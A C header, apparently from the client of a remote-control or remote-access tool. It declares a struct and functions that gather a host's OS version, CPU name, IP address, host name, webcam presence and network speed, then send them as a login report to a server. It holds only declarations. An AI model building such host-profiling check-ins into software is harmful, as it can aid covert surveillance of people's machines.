#pragma once

#include<winternl.h>
#include<ntstatus.h>
#include"_IOCPClient.h"
#include"Common.h"
#include<Vfw.h>
#pragma comment(lib,"Vfw32.lib")

#pragma pack(1)
typedef  struct  _LOGIN_INFORMATION_
{
	BYTE   IsToken;                                       //信息头部
	OSVERSIONINFOEX    OsVersionInfoEx;                  //版本信息
	char      ProcessorNameString[MAX_PATH];             //CPU主频
	IN_ADDR          ClientAddress;                      //存储32位的IPv4的地址的数据结构
	char             HostName[MAX_PATH];                 //主机名
	BOOL             IsWebCameraExist;                   //是否有摄像头
	DWORD            WebSpeed;                           //网速
}LOGIN_INFORMATION, *PLOGIN_INFORMATION;


int  SendLoginInformation(_CIOCPClient*  IOCPClient, DWORD   WedSpeed);
//获取CPU型号
NTSTATUS  GetProcessNameString(char* ProcessorNameString, ULONG* ProcessoeNameStringLength);
//判断有无摄像头
BOOL      IsWebCamera();